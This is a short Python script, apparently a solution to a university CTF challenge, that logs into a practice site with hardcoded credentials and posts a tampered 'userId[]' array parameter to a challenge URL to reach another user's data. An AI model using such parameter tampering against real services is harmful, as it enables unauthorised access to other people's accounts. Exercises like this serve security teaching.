import requests

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/o9a450a64cc2a196f55878e2bd9a27a72daea0f17017253f87e7ebd98c71c98c"

postData = {"userId[]":"11"}

response2 = session.post(targetUrl, data=postData)

print(response2.text)
